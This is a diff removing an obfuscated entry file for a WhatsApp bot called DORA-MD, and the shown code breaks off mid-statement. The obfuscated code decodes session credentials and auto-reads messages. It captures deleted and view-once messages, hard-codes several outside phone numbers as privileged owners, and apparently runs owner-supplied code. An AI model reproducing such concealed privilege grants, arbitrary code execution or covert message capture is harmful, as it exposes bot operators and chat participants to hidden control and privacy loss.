@@ -1,2 +1,778 @@
-// Obfuscated by REAL DEXTER
-const _0x2ba6a2=_0x561d;(function(_0x18de14,_0x298645){const _0x4fc395=_0x561d,_0x13b1e8=_0x18de14();while(!![]){try{const _0x9b3447=parseInt(_0x4fc395(0x30f))/0x1*(parseInt(_0x4fc395(0x2e9))/0x2)+-parseInt(_0x4fc395(0x31b))/0x3+-parseInt(_0x4fc395(0x249))/0x4+parseInt(_0x4fc395(0x1fe))/0x5+parseInt(_0x4fc395(0x253))/0x6*(parseInt(_0x4fc395(0x302))/0x7)+-parseInt(_0x4fc395(0x27c))/0x8*(parseInt(_0x4fc395(0x1f9))/0x9)+-parseInt(_0x4fc395(0x2c6))/0xa*(-parseInt(_0x4fc395(0x26a))/0xb);if(_0x9b3447===_0x298645)break;else _0x13b1e8['push'](_0x13b1e8['shift']());}catch(_0x1fc671){_0x13b1e8['push'](_0x13b1e8['shift']());}}}(_0x1453,0x344a2));const {default:makeWASocket,useMultiFileAuthState,DisconnectReason,jidNormalizedUser,getContentType,proto,generateWAMessageContent,generateWAMessage,isJidBroadcast,AnyMessageContent,prepareWAMessageMedia,areJidsSameUser,downloadContentFromMessage,MessageRetryMap,generateForwardMessageContent,generateWAMessageFromContent,generateMessageID,makeInMemoryStore,jidDecode,fetchLatestBaileysVersion,Browsers}=require(_0x2ba6a2(0x1d0)),l=console['log'],{getBuffer,getGroupAdmins,getRandom,h2k,isUrl,Json,runtime,sleep,fetchJson}=require('./lib/functions'),{AntiDelDB,initializeAntiDeleteSettings,setAnti,getAnti,getAllAntiDeleteSettings,saveContact,loadMessage,getName,getChatSummary,saveGroupMetadata,getGroupMetadata,saveMessageCount,getInactiveGroupMembers,getGroupMembersMessageCount,saveMessage}=require('./my_data'),fs=require('fs'),ff=require('fluent-ffmpeg'),P=require('pino'),config=require(_0x2ba6a2(0x314)),qrcode=require('qrcode-terminal'),StickersTypes=require(_0x2ba6a2(0x234)),util=require(_0x2ba6a2(0x2ed)),{sms,downloadMediaMessage,AntiDelete}=require('./lib'),FileType=require('file-type'),axios=require('axios'),{File}=require(_0x2ba6a2(0x2f9)),{fromBuffer}=require(_0x2ba6a2(0x223)),bodyparser=require(_0x2ba6a2(0x272)),os=require('os'),Crypto=require('crypto'),path=require('path'),prefix=config['PREFIX'],ownerNumber=['94740482244'],tempDir=path[_0x2ba6a2(0x29e)](os[_0x2ba6a2(0x298)](),'cache-temp');!fs['existsSync'](tempDir)&&fs['mkdirSync'](tempDir);const clearTempDir=()=>{const _0x66e458=_0x2ba6a2;fs[_0x66e458(0x263)](tempDir,(_0x3f9ef8,_0x231ae4)=>{const _0x23d48a=_0x66e458;if(_0x3f9ef8)throw _0x3f9ef8;for(const _0x59eafe of _0x231ae4){fs[_0x23d48a(0x26f)](path[_0x23d48a(0x29e)](tempDir,_0x59eafe),_0x45b46b=>{if(_0x45b46b)throw _0x45b46b;});}});};setInterval(clearTempDir,0x5*0x3c*0x3e8);const credsPath=__dirname+_0x2ba6a2(0x2e2);async function downloadSessionData(){const _0x4f7d50=_0x2ba6a2,_0x1bbb3b={'MnoPT':_0x4f7d50(0x33c),'rPVeV':_0x4f7d50(0x1a3),'AwCGx':_0x4f7d50(0x31f),'sbfWh':_0x4f7d50(0x179),'yumrA':_0x4f7d50(0x2f2)};if(!config[_0x4f7d50(0x1e3)])return console[_0x4f7d50(0x282)](_0x4f7d50(0x32b)),![];const _0x4b4cc0=_0x1bbb3b['MnoPT'];if(config['SESSION_ID'][_0x4f7d50(0x2d1)](_0x4b4cc0))try{!fs[_0x4f7d50(0x265)](__dirname+_0x1bbb3b[_0x4f7d50(0x308)])&&fs[_0x4f7d50(0x1f0)](__dirname+_0x1bbb3b['rPVeV']);const _0x4884c5=config['SESSION_ID']['slice'](_0x4b4cc0['length']),_0x1c1954=Buffer[_0x4f7d50(0x173)](_0x4884c5,_0x4f7d50(0x1dc))['toString'](_0x1bbb3b[_0x4f7d50(0x22e)]);return await fs['promises']['writeFile'](credsPath,_0x1c1954),console['log'](_0x1bbb3b[_0x4f7d50(0x33d)]),!![];}catch(_0x50ede3){return console[_0x4f7d50(0x282)](_0x1bbb3b['yumrA'],_0x50ede3['message']),![];}else return console['error'](_0x4f7d50(0x1f4)),![];}!fs[_0x2ba6a2(0x265)](credsPath)&&downloadSessionData();function _0x561d(_0x329f85,_0x44df01){const _0x145383=_0x1453();return _0x561d=function(_0x561d4e,_0x10057d){_0x561d4e=_0x561d4e-0x14f;let _0x114085=_0x145383[_0x561d4e];return _0x114085;},_0x561d(_0x329f85,_0x44df01);}const express=require('express'),app=express(),port=process[_0x2ba6a2(0x23e)][_0x2ba6a2(0x2aa)]||0x2382;function _0x1453(){const _0x498647=[';;;;\x0aitem4.X-ABLabel:Region\x0aEND:VCARD','reactionMessage','copyNForward','mKOhd','👨‍🎤','👩‍🦯','VORhk','readdir','🧑‍💼','existsSync','🙋‍♂️','vWFFx','remoteJid','📽️','571593AnuPVD','👩‍🔧','kRwvX','asSticker','❤️‍🔥','unlink','0@s.whatsapp.net','email','body-parser','fyxQQ','zdcHO','name','🚵‍♀️','yiirL','KiAQp','🚵‍♂️','packname','👱‍♂️','4672WXANWC','dKcuo','idzyX','ouRxD','bwNIf','participant','error','adiZY','viewOnce','👮‍♀️','OKDXJ','application/pdf','sender','🧑‍🎤','conversation','OYVgG','👱‍♀️','🤽‍♂️','video','OGuak','🧔‍♂️','UjQhD','sOaVU','Ksemf','🧛‍♂️','KxRYo','getFile','Marked\x20message\x20from\x20','tmpdir','parse','ATxcM','BKGNg','GNnhd','fromMe','join','🙍‍♂️','pHtOW','💇‍♂️','WmhnY','🧑‍🤝‍🧑','👩‍👩‍👦‍👦','vEyqg','pJLUX','👩‍🏫','wZAYg','function','PORT','catch','international','💇‍♀️','👨‍🦯','jYJPU','👨‍👩‍👦','sTnxh','status','🧑‍⚖️','sEFod','readViewOnce','LPgce','DIEzN','👩‍🎨','woKis','keys','endsWith','MZwIm','ignore','👨‍💼','👮‍♂️','🕊️','🧑‍🚀','💁‍♂️','document','🧘‍♀️','tvgwD','20nVipfk','👩‍🌾','WNlqL','HKRQo','TYGKO','🧑‍🦱','sendTextWithMentions','🗨️','sticker','🧚‍♀️','👳‍♂️','startsWith','👩‍🎓','matchAll','🕵️‍♂️','caption','bchZx','boBug','Provide\x20me\x20with\x20a\x20query\x20to\x20run\x20Master!','🧑‍🍼','EiBeL','readMessages','👨‍🍳','wOCMN','readFileSync','find','hpKZI','🚣‍♂️','/auth_info_baileys/creds.json','PhbEk','mtype','🕴‍♂️','QLxfC','key','query','2WqSgSR','notify','👨‍🦳','👨‍🚀','util','RaKAl','pBGuQ','🦸‍♂️','serializeM','❌\x20Base64\x20decode\x20failed:','👨‍🌾','*🧑‍💻⃝𝘿𝙊𝙍𝘼\x20𝙈𝘿\x20𝘽𝙊𝙏\x20𝘼𝘾𝙏𝙄𝙑𝙀\x20𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇➝💥♥️*\x0a\x0a*PREFIX:*\x20','OwnerName','status@broadcast','Wgrms','bKgmb','megajs','zQqYJ','🙎‍♀️','TcfgD','🙎‍♂️','ielsT','slice','🏄‍♂️','🕷️','2825837rDuxfe','jwsQh','QrRZh','🚶‍♀️','🧑‍🦯','👨‍👩‍👦‍👦','rPVeV','🧑‍🏭','length','🧖‍♀️','TYyHM','XqHBh','imageMessage','213479LKlUXf','HIZPT','zvSke','QLbss','QbcsK','./config','videoMessage','XhDjR','🕸️','WebMessageInfo','👨‍🦼','🤹‍♀️','547155tsaQGI','xuveO','mwSzB','🐻‍❄️','utf-8','🚴‍♂️','extname','fFZjZ','msg','AUTO_READ_STATUS','fLxwA','@g.us','jmGFe','audio','🤽‍♀️','ChLrg','❌\x20Please\x20set\x20SESSION_ID\x20in\x20environment\x20variables!','RrSXz','video/mp4','🏌️','split','qvelY','hguht','kYyNw','writeFileSync','OomIn','\x0a}\x0aa()','ext','🧜‍♂️','WcDMk','🕴‍♀️','hVIcc','👨‍🔧','DORA-MD~','sbfWh','👩‍👩‍👧‍👦','ohjQn','parseMention','random','🤾‍♀️','kkNXF','🏌️‍♀️','contextInfo','lXQDD','🧙‍♂️','message','AZUqP','HslyH','🧑‍⚕️','MOLVV','contacts','./exif','hyebN','👨‍❤️‍👨','CVXnU','🤦‍♂️','👩‍🚒','withoutContact','🧏‍♂️','🧟‍♂️','XubQh','AUTO_STATUS_REPLY','🙅‍♀️','dISyC','\x20as\x20read.','🇨🇦','EVnUR','oRLMd','🏄‍♀️','user','👩‍✈️','weZaW','👨‍👧','🕯️','set','👨‍👨‍👧‍👧','👩‍👧‍👧','👩‍👦‍👦','👩‍👦','XTKmm','👩‍🎤','YyvhB','🐿️','from','yJnya','fWaqM','FQdfl','❤️‍🩹','👨‍🎓','🔒\x20Session\x20decoded\x20and\x20saved\x20successfully!','XKLaC','sendVideoAsSticker','\x0aFN:','🧎‍♂️','👨‍👩‍👧','👩‍🦲','fkbub','👨‍🎨','update','🏃‍♀️','NHmzD','GuokK','gBNLf','🤵‍♂️','👩‍🔬','log','groups','author','lBnYv','🧞‍♀️','🧟‍♀️','CmrVF','MKfeE','ATtQY','👩‍🍼','👨‍🚒','fromObject','krOJE','@s.whatsapp.net','👩‍👧','🤼‍♂️','XfsOE','wwiob','hKRLw','tENvo','RmaQw','yNHbc','quotedMessage','fromBuffer','qbKbC','messages.update','/auth_info_baileys','string','rOZOT','Server\x20listening\x20on\x20port\x20http://localhost:','sendFile','alloc','👨‍⚖️','🧛‍♀️','🚣‍♀️','Bot\x20connected\x20to\x20whatsapp\x20✅','👩‍💻','pattern','AUTOLIKESTATUS','groupMetadata','oeHIM','MtUIo','👩‍❤️‍💋‍👩','🏞️','🤷‍♀️','Qiwdq','🙆‍♂️','Firefox','floor','photo','🤦‍♀️','🕴️','bmLnq','👨‍🦱','zKgiS','rUiFl','⛹️‍♀️','CvnnB','application/octet-stream','🧑‍🏫','👩‍👧‍👦','👨‍👦‍👦','image/webp','👩‍👩‍👦','text','🗣️','viewOnceMessageV2','true','format','head','🏌️‍♂️','@whiskeysockets/baileys','includes','content-type','creds.update','getName','BEGIN:VCARD\x0aVERSION:3.0\x0aN:','🐕‍🦺','🕵️','VnDzS','path','🤼‍♀️','dfDIO','base64','🖐️','🧞‍♂️','👩‍🦳','KCSbO','ephemeralMessage','🧔‍♀️','SESSION_ID','test','OnVwB','👩‍🍳','👯‍♀️','DOFdy','👁️‍🗨️','GdgOB','commands','writeFile','github','bTcmb','BwfHr','mkdirSync','💆‍♀️','🧬\x20Installing\x20Plugins','👩‍🦱','❌\x20SESSION_ID\x20must\x20start\x20with\x20\x22DORA-MD~\x22\x20prefix!','replace','sDoRU','./exif.js','EsASR','1539YTynVp','ytyZj','VSVKh','🧝‍♂️','JytKn','584455OWMyoZ','PTMHp','iOoyF','👩‍🦽','DeZRo','🇪🇸','pIxVd','StzGh','💆‍♂️','bVEWJ','94743454928','sendButtonText','👨‍🦰','VYccn','BHlMO','send','map','promises','close','UNXsV','👨‍👨‍👧','ryBTB','🧑‍🦼','atzXK','🙆‍♀️','🧑‍🌾','🧑‍🦲','👨‍🦽','silent','👩‍🦰','decodeJid','🏋️‍♀️','readdirSync','sendMessage','aKMfW','👨‍🏭','YnCeN','file-type','🗯️','Xtbbo','🧗‍♀️','KhKea','MODE','🧑‍🎓','sLxuJ','bXNbZ','categories','👨‍👩‍👧‍👧','AwCGx','oyRTf','🇯🇵','waUploadToServer','👩‍💼','yQtGU','wa-sticker-formatter','🧍‍♂️','image','🧑‍🔬','all','🏃‍♂️','🛣️','👩‍🏭','trim','⛹️‍♂️','env','MVmWM','./plugins/','subject','kRicj','xexdj','🦹‍♀️','.js','gmrTp','🙅‍♂️','🇺🇸','1366240CSrcYK','🏋️','🧚‍♂️','OtwOx','pVBYL','DQAsS','🕳️','type','vdkkk','SQjAU','6kgqTko','🧗‍♂️','sendFileUrl','MyOtc','uOHli','react','👩‍❤️‍👨','😮‍💨','kCvcM'];_0x1453=function(){return _0x498647;};return _0x1453();}async function connectToWA(){const _0x34174a=_0x2ba6a2,_0x3b8d33={'dfDIO':function(_0x1b2088,_0x53c8e3){return _0x1b2088==_0x53c8e3;},'bmvve':_0x34174a(0x210),'uZuSF':function(_0x57a38d){return _0x57a38d();},'ATtQY':function(_0x4bde3e,_0x35ffbe){return _0x4bde3e===_0x35ffbe;},'sEFod':'open','Wgrms':function(_0x14b4f0,_0x29591d){return _0x14b4f0(_0x29591d);},'QVrXA':'./plugins/','vdkkk':'Plugins\x20installed\x20successful\x20✅','idzyX':'Delete\x20Detected:','WcDMk':function(_0x43fb06,_0x4114f3,_0x55ed39){return _0x43fb06(_0x4114f3,_0x55ed39);},'hVIcc':'body','yVYEY':'text','dKcuo':'image','OnVwB':function(_0x376abe,_0x4f8f4f){return _0x376abe===_0x4f8f4f;},'MyOtc':_0x34174a(0x1e1),'RaKAl':function(_0x5629e7,_0x112294){return _0x5629e7===_0x112294;},'YyvhB':function(_0x41e00b,_0xd0355){return _0x41e00b(_0xd0355);},'KCSbO':_0x34174a(0x2f6),'RiLwf':function(_0x32511c,_0x9ce315){return _0x32511c===_0x9ce315;},'sDoRU':function(_0xcf0795,_0x3dedf8){return _0xcf0795===_0x3dedf8;},'DeZRo':_0x34174a(0x1cc),'OYVgG':'extendedTextMessage','krOJE':'conversation','NYNJV':function(_0x1d12e3,_0x4cb1ea){return _0x1d12e3===_0x4cb1ea;},'xuveO':'string','CVXnU':function(_0x28f82d,_0x6d8660){return _0x28f82d+_0x6d8660;},'adiZY':_0x34174a(0x196),'GdgOB':'Sin\x20Nombre','qbKbC':'94740482244','bVEWJ':'94757660788','ToHVl':'94789958225','ielsT':function(_0x51d0a4,_0x56802e){return _0x51d0a4(_0x56802e);},'wDYXA':'object','DIEzN':function(_0x5deb6a,_0x58ea8f){return _0x5deb6a(_0x58ea8f);},'dISyC':function(_0x963f4,_0x16c0f){return _0x963f4+_0x16c0f;},'LzXbM':'const\x20a\x20=\x20async()=>{\x0a','rfaHt':_0x34174a(0x335),'fWaqM':function(_0x19db5b,_0x32c53f){return _0x19db5b(_0x32c53f);},'OrGje':'94743454928','vEyqg':'🕴️','LPgce':_0x34174a(0x317),'kfbvx':'🕯️','KiAQp':'🕳️','yJnya':_0x34174a(0x301),'NHmzD':_0x34174a(0x248),'jmGFe':'🇨🇦','dxley':'🇦🇺','Qiwdq':'🇫🇷','ouRxD':_0x34174a(0x23a),'VrFxP':'🛫️','cVHxq':_0x34174a(0x239),'MpnFi':'🏊‍♂️','VORhk':'🤷‍♂️','KhKea':_0x34174a(0x247),'gmrTp':'🙅‍♀️','mtiyT':_0x34174a(0x157),'rUiFl':_0x34174a(0x1bb),'pnoqn':_0x34174a(0x2e5),'UjQhD':_0x34174a(0x269),'QZXpz':'🐈‍⬛','bchZx':_0x34174a(0x172),'MOLVV':_0x34174a(0x31e),'bwNIf':_0x34174a(0x25a),'pVBYL':'😵‍💫','kkNXF':_0x34174a(0x26e),'uFqCN':'👁️‍🗨️','WskdD':_0x34174a(0x2cd),'WNlqL':_0x34174a(0x1dd),'kRwvX':_0x34174a(0x290),'lVYJD':'🧔‍♀️','ohjQn':_0x34174a(0x20a),'zdNvS':'👨‍🦱','jYJPU':_0x34174a(0x2eb),'XqHBh':'🧑‍🦰','sLxuJ':_0x34174a(0x1df),'HINYy':'🧑‍🦳','ppaKs':'🙍‍♀️','TgFzb':'🙎‍♂️','JDdqf':'💁‍♂️','kRicj':'💁‍♀️','ICbYN':_0x34174a(0x266),'pJLUX':'🙇‍♂️','iVEUt':_0x34174a(0x150),'xexdj':_0x34174a(0x2d2),'oeHIM':_0x34174a(0x1c4),'ryBTB':'👨‍🏫','BHlMO':_0x34174a(0x2a7),'YnCeN':_0x34174a(0x1a9),'oNxnp':'👩‍⚖️','Ksemf':'🧑‍🍳','oRZPr':_0x34174a(0x33b),'BKGNg':_0x34174a(0x309),'bFumg':'👩‍💼','VnjlN':_0x34174a(0x237),'WyrCL':_0x34174a(0x260),'VnDzS':'🧑‍🎨','CvnnB':_0x34174a(0x2b8),'pIxVd':'🧑‍✈️','QbcsK':'👨‍✈️','odLDh':'🧑‍🚀','ATxcM':_0x34174a(0x2ec),'MVmWM':'👩‍🚀','zvSke':'🧑‍🚒','MKfeE':_0x34174a(0x193),'weZaW':_0x34174a(0x285),'RrSXz':_0x34174a(0x1d7),'ytyZj':'💂‍♂️','SQjAU':'👷‍♂️','vWFFx':'👷‍♀️','pBGuQ':'👳‍♀️','RnESC':'🤵‍♀️','AZUqP':'👰‍♂️','EsASR':'👰‍♀️','zhpYX':_0x34174a(0x192),'BpKkL':_0x34174a(0x2d9),'TvcRD':'🧑‍🎄','dtRuj':'🦸‍♂️','bTcmb':'🦸‍♀️','cDMgi':'🦹‍♂️','sOaVU':_0x34174a(0x244),'BwfHr':_0x34174a(0x347),'OiMGJ':'🧚‍♂️','zQqYJ':_0x34174a(0x2cf),'DQAsS':'🧛‍♀️','drlYZ':_0x34174a(0x337),'artIz':'🧝‍♀️','OGuak':_0x34174a(0x1de),'Xtbbo':_0x34174a(0x18e),'sTnxh':'💆‍♂️','PMwCF':'💆‍♀️','RmaQw':_0x34174a(0x305),'rOZOT':'🧍‍♀️','BlpwO':_0x34174a(0x17d),'tvgwD':'🧎‍♀️','fhNBG':_0x34174a(0x306),'iySKf':_0x34174a(0x261),'pHtOW':_0x34174a(0x214),'PhbEk':'👩‍🦼','ZBhIo':_0x34174a(0x219),'hguht':'👯‍♂️','QrRZh':_0x34174a(0x1e7),'VfgCW':'🧖‍♂️','OomIn':_0x34174a(0x30b),'VSVKh':_0x34174a(0x226),'mKOhd':_0x34174a(0x32e),'oRLMd':'🏌️‍♂️','boBug':_0x34174a(0x344),'HIZPT':_0x34174a(0x300),'XKLaC':_0x34174a(0x1ab),'wZAYg':_0x34174a(0x1c1),'syNDy':'🏋️‍♂️','EJfmP':_0x34174a(0x320),'GuokK':'🤸‍♀️','GNnhd':_0x34174a(0x1da),'TcfgD':_0x34174a(0x28d),'YyieF':'🤹‍♂️','wOCMN':'🧘‍♂️','MZwIm':'👩‍❤️‍💋‍👨','OnUgL':_0x34174a(0x22d),'MiIiZ':'👨‍👨‍👦‍👦','XubQh':_0x34174a(0x16b),'UNXsV':_0x34174a(0x1c8),'yNHbc':'👩‍👩‍👧','tENvo':'👨‍👦','zKgiS':_0x34174a(0x168),'mwSzB':'👨‍👧‍👧','oDUJW':_0x34174a(0x16e),'CzGUZ':_0x34174a(0x16d),'bmLnq':_0x34174a(0x197),'hqPKm':'👩‍👧‍👧','SLyMY':function(_0x19328b,_0x16dc4c){return _0x19328b*_0x16dc4c;},'RZEbK':'🇬🇧','atdzY':_0x34174a(0x230),'bNXeC':_0x34174a(0x1b4),'yiirL':_0x34174a(0x21d),'wwiob':'🙆‍♂️','kCvcM':_0x34174a(0x216),'OKDXJ':'💇‍♂️','VYccn':'💇‍♀️','gONSu':'❤️‍🩹','XfsOE':_0x34174a(0x224),'ZrMxz':'👁️','imeYU':'👨‍🦲','XzFkc':_0x34174a(0x21b),'jwsQh':'👩‍🦲','hyebN':_0x34174a(0x28c),'xwPFb':_0x34174a(0x27b),'qXvPH':'🤷‍♀️','BUhXa':'👨‍⚕️','DOFdy':'👩‍⚕️','PyoqA':'🧑‍🎓','aKMfW':_0x34174a(0x178),'rxTlR':_0x34174a(0x217),'uvSMJ':_0x34174a(0x2f3),'IUVBM':'👨‍🍳','wsGhO':_0x34174a(0x26b),'ankGM':'👨‍🏭','HslyH':'👩‍🏭','ffZmz':_0x34174a(0x264),'WmhnY':_0x34174a(0x2be),'hpKZI':'👨‍🔬','EAxzr':'🧑‍💻','PTMHp':_0x34174a(0x181),'TYyHM':'💂‍♀️','atzXK':'👨‍🍼','wiQQv':'🧛‍♂️','lXQDD':'🧜‍♀️','fyxQQ':'🧞‍♀️','MtrLD':_0x34174a(0x15b),'BOVRz':'🚶‍♂️','HKRQo':_0x34174a(0x235),'StzGh':_0x34174a(0x2ae),'fLxwA':'🧑‍🦽','JrfDU':_0x34174a(0x201),'GfNAt':_0x34174a(0x183),'uOHli':_0x34174a(0x254),'VLhzs':_0x34174a(0x164),'QZErG':_0x34174a(0x24a),'xEQxx':_0x34174a(0x279),'nWUBm':'🚵‍♀️','hKRLw':_0x34174a(0x329),'XhDjR':'👨‍👩‍👧‍👦','jhfuh':_0x34174a(0x212),'JytKn':'👨‍👨‍👧‍👦','rDVvc':_0x34174a(0x33e),'mgXmr':_0x34174a(0x1c6),'zdcHO':_0x34174a(0x1c5),'bOQCp':function(_0x1c2716,_0x460e1f){return _0x1c2716!==_0x460e1f;},'EiBeL':'private','XTKmm':function(_0x49825f,_0x2c61e4){return _0x49825f&&_0x2c61e4;},'lBnYv':_0x34174a(0x18a),'QLxfC':'./command','SJjzU':'3|0|1|4|2','bKgmb':function(_0x9653af,_0x211ccd,_0x457f7a){return _0x9653af(_0x211ccd,_0x457f7a);},'rXJMt':function(_0x4892e7,_0x445d99){return _0x4892e7!=_0x445d99;},'ChLrg':function(_0x226020,_0x16cb85,_0x2ebf8f,_0x40d990){return _0x226020(_0x16cb85,_0x2ebf8f,_0x40d990);},'MSJvY':function(_0x4b6b7d,_0x443dfc,_0x513b61){return _0x4b6b7d(_0x443dfc,_0x513b61);},'QLbss':function(_0x74ac17,_0x57a177){return _0x74ac17===_0x57a177;},'MtUIo':'gif','fgoQw':'Message','qvelY':_0x34174a(0x287),'kYyNw':function(_0x55c056,_0x343f9b){return _0x55c056===_0x343f9b;},'OtwOx':_0x34174a(0x28e),'bXNbZ':_0x34174a(0x32d),'gBNLf':function(_0x519c9e,_0x517b94){return _0x519c9e===_0x517b94;},'KxRYo':_0x34174a(0x328),'IIbJR':'audio/mpeg','YxpRi':'.bin','RNaMb':function(_0x5d2a9b,_0x2240e9){return _0x5d2a9b+_0x2240e9;},'sekqk':function(_0x1330d5,_0x5f53da){return _0x1330d5*_0x5f53da;},'FQdfl':function(_0x5a5088,_0x3be7f2){return _0x5a5088(_0x3be7f2);},'zIsZm':'sticker','CmrVF':_0x34174a(0x2c3),'BkpXM':function(_0x178f2d,_0x3f7185){return _0x178f2d(_0x3f7185);},'iOoyF':function(_0xcc3e29,_0xabf8cb,_0x516ea0){return _0xcc3e29(_0xabf8cb,_0x516ea0);},'yQtGU':_0x34174a(0x1c7),'uXiCl':function(_0x38177b,_0xcfca7b){return _0x38177b(_0xcfca7b);},'fFZjZ':_0x34174a(0x1dc),'ytMfj':function(_0x47c410,_0x298708,_0xce597e){return _0x47c410(_0x298708,_0xce597e);},'woKis':function(_0x4a9fb8,_0x4fdf34){return _0x4a9fb8+_0x4fdf34;},'EnAyN':_0x34174a(0x2ac),'nBfTD':function(_0x29d8c4,_0x20751a){return _0x29d8c4===_0x20751a;},'WwucJ':'WhatsApp','oyRTf':function(_0x5efa80,_0x5a1e36){return _0x5efa80(_0x5a1e36);},'wbeit':_0x34174a(0x16a),'UYBIC':_0x34174a(0x2b2),'LpYCG':'Connecting\x20to\x20WhatsApp\x20⏳️...','TYGKO':function(_0x520fa0,_0x461e57){return _0x520fa0(_0x461e57);},'EVnUR':_0x34174a(0x21a),'AZNEh':_0x34174a(0x1d3),'QXkIn':'messages.upsert'};console['log'](_0x3b8d33['LpYCG']);const {state:_0x1bf04e,saveCreds:_0x4d1d37}=await _0x3b8d33[_0x34174a(0x2b7)](useMultiFileAuthState,__dirname+'/auth_info_baileys/');var {version:_0x469c49}=await fetchLatestBaileysVersion();const _0x25e2e4=_0x3b8d33[_0x34174a(0x2ca)](makeWASocket,{'logger':_0x3b8d33['uXiCl'](P,{'level':_0x3b8d33[_0x34174a(0x162)]}),'printQRInTerminal':![],'browser':Browsers['macOS'](_0x34174a(0x1b8)),'syncFullHistory':!![],'auth':_0x1bf04e,'version':_0x469c49});_0x25e2e4['ev']['on']('connection.update',_0x1d9c00=>{const _0x4e563c=_0x34174a,{connection:_0x1fdd14,lastDisconnect:_0x50aebd}=_0x1d9c00;if(_0x1fdd14===_0x3b8d33['bmvve'])_0x50aebd['error']['output']['statusCode']!==DisconnectReason['loggedOut']&&_0x3b8d33['uZuSF'](connectToWA);else{if(_0x3b8d33[_0x4e563c(0x191)](_0x1fdd14,_0x3b8d33[_0x4e563c(0x2b4)])){console['log'](_0x4e563c(0x1f2));const _0x4b1b1c=_0x3b8d33[_0x4e563c(0x2f7)](require,_0x4e563c(0x1d9));fs[_0x4e563c(0x21e)](_0x3b8d33['QVrXA'])['forEach'](_0x529dc7=>{const _0x4245c9=_0x4e563c;_0x3b8d33[_0x4245c9(0x1db)](_0x4b1b1c[_0x4245c9(0x321)](_0x529dc7)['toLowerCase'](),_0x4245c9(0x245))&&require(_0x4245c9(0x240)+_0x529dc7);}),console['log'](_0x3b8d33[_0x4e563c(0x251)]),console['log'](_0x4e563c(0x1ac));let _0xd7f031=_0x4e563c(0x2f4)+prefix;_0x25e2e4['sendMessage'](_0x25e2e4[_0x4e563c(0x165)]['id'],{'image':{'url':'https://files.catbox.moe/i5fwv5.jpg'},'caption':_0xd7f031});}}}),_0x25e2e4['ev']['on'](_0x3b8d33['AZNEh'],_0x4d1d37),_0x25e2e4['ev']['on'](_0x34174a(0x1a2),async _0x24c554=>{const _0x4fc75f=_0x34174a;for(const _0x31361b of _0x24c554){_0x3b8d33[_0x4fc75f(0x191)](_0x31361b[_0x4fc75f(0x182)]['message'],null)&&(console[_0x4fc75f(0x189)](_0x3b8d33[_0x4fc75f(0x27e)],JSON['stringify'](_0x31361b,null,0x2)),await _0x3b8d33[_0x4fc75f(0x338)](AntiDelete,_0x25e2e4,_0x24c554));}}),_0x25e2e4['ev']['on'](_0x3b8d33['QXkIn'],async _0xda26d0=>{const _0x399299=_0x34174a;_0xda26d0=_0xda26d0['messages'][0x0];if(!_0xda26d0['message'])return;_0xda26d0['message']=_0x3b8d33[_0x399299(0x1e5)](_0x3b8d33[_0x399299(0x2f7)](getContentType,_0xda26d0['message']),_0x3b8d33[_0x399299(0x256)])?_0xda26d0[_0x399299(0x348)]['ephemeralMessage']['message']:_0xda26d0[_0x399299(0x348)];_0x3b8d33[_0x399299(0x2ee)](config['READ_MESSAGE'],_0x399299(0x1cc))&&(await _0x25e2e4[_0x399299(0x2db)]([_0xda26d0[_0x399299(0x2e7)]]),console[_0x399299(0x189)](_0x399299(0x297)+_0xda26d0['key']['remoteJid']+_0x399299(0x160)));if(_0xda26d0['message'][_0x399299(0x1cb)])_0xda26d0[_0x399299(0x348)]=_0x3b8d33[_0x399299(0x171)](getContentType,_0xda26d0['message'])==='ephemeralMessage'?_0xda26d0['message'][_0x399299(0x1e1)]['message']:_0xda26d0['message'];_0xda26d0['key']&&_0xda26d0['key']['remoteJid']===_0x3b8d33[_0x399299(0x1e0)]&&_0x3b8d33['RiLwf'](config[_0x399299(0x324)],'true')&&await _0x25e2e4[_0x399299(0x2db)]([_0xda26d0[_0x399299(0x2e7)]]);if(_0xda26d0[_0x399299(0x2e7)]&&_0x3b8d33[_0x399299(0x1f6)](_0xda26d0[_0x399299(0x2e7)]['remoteJid'],_0x3b8d33[_0x399299(0x1e0)])&&config[_0x399299(0x15d)]===_0x3b8d33[_0x399299(0x202)]){const _0x461c12=_0xda26d0[_0x399299(0x2e7)]['participant'],_0x570892=''+config['AUTO_STATUS__MSG'];await _0x25e2e4[_0x399299(0x21f)](_0x461c12,{'text':_0x570892,'react':{'text':'💜','key':_0xda26d0['key']}},{'quoted':_0xda26d0});}if(_0xda26d0[_0x399299(0x2e7)]&&_0xda26d0['key']['remoteJid']===_0x399299(0x2f6)&&config[_0x399299(0x1af)]==='true'){const _0xdc6e46=await _0x25e2e4[_0x399299(0x21c)](_0x25e2e4['user']['id']);await _0x25e2e4[_0x399299(0x21f)](_0xda26d0['key'][_0x399299(0x268)],{'react':{'key':_0xda26d0[_0x399299(0x2e7)],'text':'💚'}},{'statusJidList':[_0xda26d0['key']['participant'],_0xdc6e46]});};await Promise[_0x399299(0x238)]([saveMessage(_0xda26d0)]);const _0xde9345=sms(_0x25e2e4,_0xda26d0),_0x3df601=getContentType(_0xda26d0[_0x399299(0x348)]),_0x4bde05=JSON['stringify'](_0xda26d0['message']),_0x4e1a46=_0xda26d0[_0x399299(0x2e7)][_0x399299(0x268)],_0x403f40=_0x3b8d33['dfDIO'](_0x3df601,_0x3b8d33[_0x399299(0x28b)])&&_0xda26d0[_0x399299(0x348)]['extendedTextMessage']['contextInfo']!=null?_0xda26d0['message']['extendedTextMessage'][_0x399299(0x345)][_0x399299(0x19f)]||[]:[],_0x39ba9c=_0x3df601===_0x3b8d33[_0x399299(0x195)]?_0xda26d0['message'][_0x399299(0x28a)]:_0x3b8d33['NYNJV'](_0x3df601,'extendedTextMessage')?_0xda26d0['message']['extendedTextMessage'][_0x399299(0x1c9)]:_0x3b8d33[_0x399299(0x1db)](_0x3df601,_0x399299(0x30e))&&_0xda26d0['message'][_0x399299(0x30e)][_0x399299(0x2d5)]?_0xda26d0[_0x399299(0x348)][_0x399299(0x30e)][_0x399299(0x2d5)]:_0x3df601==_0x399299(0x315)&&_0xda26d0['message']['videoMessage'][_0x399299(0x2d5)]?_0xda26d0[_0x399299(0x348)]['videoMessage'][_0x399299(0x2d5)]:'',_0x2ac4e5=_0x39ba9c[_0x399299(0x2d1)](prefix);var _0x5836f3=typeof _0xda26d0[_0x399299(0x1c9)]==_0x3b8d33['xuveO']?_0xda26d0[_0x399299(0x1c9)]:![];const 